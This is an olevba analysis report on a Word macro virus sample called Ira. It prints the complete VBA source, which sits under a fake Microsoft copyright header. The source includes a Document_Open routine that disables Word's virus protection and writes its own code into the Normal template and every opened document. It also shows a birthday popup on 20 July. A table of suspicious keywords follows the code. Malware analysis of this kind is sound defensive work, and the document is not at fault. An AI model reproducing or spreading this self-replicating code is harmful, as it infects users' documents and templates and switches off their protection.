olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ira-9163dd4338aec90627f7870ac845ab9d4494fa1d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ira-9163dd4338aec90627f7870ac845ab9d4494fa1d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------
'               Copyright (C) 2001 Microsoft Corporation
'
' You have a royalty-free right to use, modify, reproduce and distribute
' the Sample Application Files (and/or any modified version) in any way
' you find useful, provided that you agree that Microsoft has no warranty,
' obligations or liability for any Sample Application Files.
' ------------------------------------------------------------------------
Private Sub Document_Open()
On Error Resume Next
Dim Temp, Body As String
Dim ADocument, NTemplate As Object
Dim AFlag, NFlag As Boolean
Const Length = 1799
Set ADocument = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTemplate = NormalTemplate.VBProject.VBComponents.Item(1)
 AFlag = True
 NFlag = True
 Options.VirusProtection = Not AFlag
 If NTemplate.CodeModule.CountOfLines <> 0 Then
  Temp = NTemplate.CodeModule.Lines(1, NTemplate.CodeModule.CountOfLines)
 End If
 If InStr(Temp, "' " + String(72, "-")) = 0 Then
  If InStr(Temp, "Document_Open") = 0 Then NFlag = False
 Else
  Body = Temp: Temp = ""
 End If
 If ADocument.CodeModule.CountOfLines <> 0 Then
  Temp = ADocument.CodeModule.Lines(1, ADocument.CodeModule.CountOfLines)
 End If
 If InStr(Temp, "' " + String(72, "-")) = 0 Then
  If InStr(Temp, "Document_Open") = 0 Then AFlag = False
 Else
  Body = Temp: Temp = ""
 End If
 Body = Mid$(Body, InStr(Body, "' " + String(72, "-")), Length)
 If NFlag = False Then
  NTemplate.CodeModule.InsertLines 1, Body
  NormalTemplate.Save
 End If
 If Day(Date) = 20 And Month(Date) = 7 Then MsgBox "Ира !!! С днем рождения !!!", vbExclamation, "ViRUS"
 If AFlag = False Then
  ADocument.CodeModule.InsertLines 1, Body
  ActiveDocument.Save
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

